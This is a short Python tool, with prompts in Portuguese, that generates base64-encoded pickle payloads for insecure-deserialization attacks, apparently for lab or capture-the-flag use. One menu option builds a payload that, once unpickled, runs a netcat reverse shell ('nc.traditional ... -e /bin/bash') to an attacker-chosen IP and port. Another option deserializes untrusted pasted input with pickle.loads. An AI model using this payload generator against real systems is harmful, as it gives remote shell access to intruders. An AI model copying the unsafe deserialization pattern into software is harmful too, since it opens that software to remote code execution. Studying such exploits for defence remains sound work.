import pickle
import base64
import os

while True:

    try:

        tabela = int(input("\nDigite o que você deseja fazer:\n\n1: Shell Reverse\n2: Serielização de um dado normal\n3: Fazer Desserielização\n0: Fechar programa\n\nDigite a opção aqui: "))

    except ValueError:

        print("\nPor favor digite uma das opções possíveis!")

        continue

    if tabela == 0:
        print("\nFim do programa!")
        break

    if tabela == 2:

        dado = input("\nDigite o dado para fazer a serialização: ")

        class Serializacao1:

            def __reduce__(self):
                return(print, (dado,))
            
        print("\nA serielização é: ", base64.b64encode(pickle.dumps(Serializacao1())))

    if tabela == 1:

        ip = input("\nDigite o IP para a Shell Reverse: ")

        porta = input("\nDigite a porta para a Shell Reverse: ")

        class Serializacao2:

            def __reduce__(self):
                    return(os.system, (f"nc.traditional {ip} {porta} -e /bin/bash",))
        
        print("\nA serielização é: ", base64.b64encode(pickle.dumps(Serializacao2())))

    if tabela == 3:
    
        data = input("\nDigite a Serialização: ")
        deserielazer = pickle.loads(base64.b64decode(data))
        print(deserielazer)